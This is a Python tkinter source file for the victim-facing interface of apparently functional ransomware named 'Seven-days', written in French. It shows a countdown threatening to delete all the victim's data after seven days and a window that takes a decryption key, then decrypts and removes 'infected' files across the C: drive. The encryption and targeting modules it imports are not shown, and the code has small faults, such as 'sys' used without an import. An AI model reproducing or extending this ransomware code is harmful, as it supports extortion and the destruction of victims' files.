#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from tkinter import *
from tkinter.filedialog import askopenfilename
import string, os, time, datetime
from decrypter.decrypter import Decryption

__home__ = os.path.expanduser("~")
__root__ = os.path.abspath(os.path.dirname(sys.argv[0]))
__pictures__ = __root__+r'\statics\pictures'

class Interface:
    def __init__(self):
        self.window = Tk()
        self.window.wm_title("Seven-days")
        self.window.iconbitmap(__pictures__+r'\ring.ico')
        self.w, self.h = self.window.winfo_screenwidth(), self.window.winfo_screenheight()

    def time_left(self):
        self.canvas = Canvas(self.window, width=300, height=280, background='black')
        self.image = PhotoImage(file=__pictures__+r'\ring_interface.gif')
        self.item = self.canvas.create_image(150,150, image=self.image)
        self.canvas.pack()

        self.text_label = Label(self.window, text="Lors ce que ce décompte aura atteint 7 jours, toutes vos données seront supprimées", font=("Helvetica", 16))
        self.text_label.pack()

        self.label = Label(self.window, text="", font=("Helvetica", 30))
        self.label.pack()

        self.exit_btn=Button(self.window, text="Quitter", command=self.window.quit)
        self.exit_btn.pack()

        self.label.grid(row=1)
        self.text_label.grid(row=2)
        self.exit_btn.grid(row=3)
        self.canvas.grid(row=1, column=3, rowspan=10, padx=4, pady=2)
        self.countdown()
        self.window.mainloop()

    def countdown(self):
        from target.target import Target
        self.target = Target()
        self.begin_time = float(self.target.watch_time())
        self.current_time = float(time.time())
        self.gameover = 604800
        if(round(self.current_time - self.begin_time) > self.gameover):
            self.label.configure(text="Suppression des données...")
            self.text_label.configure(text="Veuillez nous excusez pour la gêne occasionée.")
        else:
            self.label.configure(text="{}".format(str(datetime.timedelta(
                                seconds=int(self.current_time - self.begin_time)
                            ))))
            self.window.after(1000, self.countdown)

    def create_window(self):
        self.canvas = Canvas(self.window, width=300, height=280, background='black')
        self.image = PhotoImage(file=__pictures__+r'\ring_interface.gif')
        self.item = self.canvas.create_image(150,150, image=self.image)
        self.canvas.pack()

        self.decrypt_label = Label(self.window, text="Clé de déchiffrement:")
        self.decrypt_entry = Entry(self.window, width=40)
        self.decrypt_label.pack()
        self.decrypt_entry.pack()

        self.decrypt_btn=Button(self.window, text="Déchiffrement", command=self.decrypt_ui,bg="red")
        self.decrypt_btn.pack()

        self.browser_btn = Button(self.window, text='Selectionner JSON', command=self.load_file, width=10)
        self.browser_btn.pack()

        self.exit_btn=Button(self.window, text="Quitter", command=self.window.quit)
        self.exit_btn.pack()

        self.browser_value = StringVar()
        self.browser_entry = Entry(self.window, textvariable = self.browser_value, width=40)
        self.browser_entry.pack()

        self.decrypt_label.grid(row=1)
        self.decrypt_entry.grid(row=1, column=2)

        self.browser_btn.grid(row=2)
        self.browser_entry.grid(row=2, column=2)
        self.decrypt_btn.grid(row=3)
        self.exit_btn.grid(row=3, column=2)
        self.canvas.grid(row=1, column=3, rowspan=10, padx=4, pady=2)

        self.window.mainloop()

    def load_file(self):
        self.fname = askopenfilename(filetypes=(("JSON files", "*.json"),
                                           ("All files", "*.*") ))
        if self.fname:
            try:
                self.browser_value.set(self.fname)
            except:
                print("Failed to read file {}".format(self.fname))
            return

    def decrypt_ui(self):
        from decrypter.decrypter import Decryption
        from target.target import Target
        self.target = Target()
        self.decryption = Decryption()

        self.target_data_json = self.browser_entry.get()
        self.decryption_key = self.decrypt_entry.get()
        if(self.target_data_json):
            self.infected_files = self.target.renamed_files(self.target_data_json)
            self.decryption_key = self.target.get_key(self.target_data_json)

            for ifile in self.infected_files:
                self.decryption.decrypt_file(self.decryption_key, ifile)

        elif(self.decryption_key):
            self.drives = self.target.get_drives()
            self.main_drives = ["".join("c:\\") if "c" in self.drives else self.drives[0]]
            self.main_drive = "".join(self.main_drives)
            # self.main_drive = __home__+r"\testing_sevendays"
            self.infected_files = self.target.renamed_files(self.main_drive)
            try:
                try:
                    for ifile in self.infected_files:
                        if("$Recycle.Bin" in ifile):
                            pass
                        else:
                            self.decryption.decrypt_file(self.decryption_key, ifile)
                            os.remove(ifile)
                except Exception as error:
                    pass

            except Exception as err:
                self.top = Toplevel()
                self.top.title("Warning")

                self.msg = Message(self.top, text="Mauvaise clé")
                self.msg.pack()

                self.close = Button(self.top, text="Annuler", command=self.top.destroy)
                self.close.pack()

        else:
            self.top = Toplevel()
            self.top.title("Warning")

            self.msg = Message(self.top, text="No key provided")
            self.msg.pack()

            self.close = Button(self.top, text="Annuler", command=self.top.destroy)
            self.close.pack()
